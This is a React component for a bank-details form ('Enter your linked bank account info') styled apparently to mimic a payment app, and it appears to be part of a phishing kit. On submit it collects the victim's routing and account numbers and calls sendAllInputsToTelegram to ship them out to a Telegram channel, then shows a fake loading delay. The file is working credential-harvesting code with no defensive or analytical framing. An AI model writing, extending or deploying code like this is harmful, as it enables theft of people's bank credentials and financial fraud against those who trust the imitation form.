import React, { useState } from 'react';
import { HelpCircle, Loader2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { sendAllInputsToTelegram } from '../utils/telegram';

export function BankInfo() {
  const [routingNumber, setRoutingNumber] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (routingNumber && accountNumber) {
      setIsLoading(true);
      await sendAllInputsToTelegram();
      // Simulate processing
      setTimeout(() => {
        setIsLoading(false);
        // navigate('/success'); // Or wherever next
      }, 2000);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-6">
      <div className="w-full max-w-[520px] mx-auto">
        <h1 className="text-[32px] md:text-[40px] font-bold mb-4 leading-tight tracking-tight">
          Enter your linked bank account info
        </h1>

        <button className="flex items-center gap-2 text-[#00D632] mb-12 hover:opacity-80 transition-opacity">
          <HelpCircle size={20} />
          <span className="text-[17px] font-medium">Get help</span>
        </button>

        <form onSubmit={handleSubmit} className="space-y-8">
          <div className="space-y-2">
            <label className="text-[#8a8a8a] text-[17px] block">
              Routing number
            </label>
            <div className="bg-[#1A1A1A] rounded-2xl p-4">
              <input
                type="text"
                name="routing_number"
                value={routingNumber}
                onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, ''))}
                placeholder="123456789"
                className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
              />
            </div>
          </div>

          <div className="space-y-2">
            <label className="text-[#8a8a8a] text-[17px] block">
              Account number
            </label>
            <div className="bg-[#1A1A1A] rounded-2xl p-4">
              <input
                type="text"
                name="account_number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
                placeholder="Full account number"
                className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
              />
            </div>
          </div>

          <div className="pt-4">
            <button
              type="submit"
              disabled={isLoading || !routingNumber || !accountNumber}
              className={`w-full py-4 rounded-full text-[18px] font-bold transition-all flex items-center justify-center ${
                routingNumber && accountNumber && !isLoading
                  ? 'bg-[#00D632] text-black hover:opacity-90'
                  : 'bg-[#00D632]/20 text-black/30 cursor-not-allowed'
              }`}
            >
              {isLoading ? (
                <Loader2 className="animate-spin" size={24} strokeWidth={3} />
              ) : (
                'Continue'
              )}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
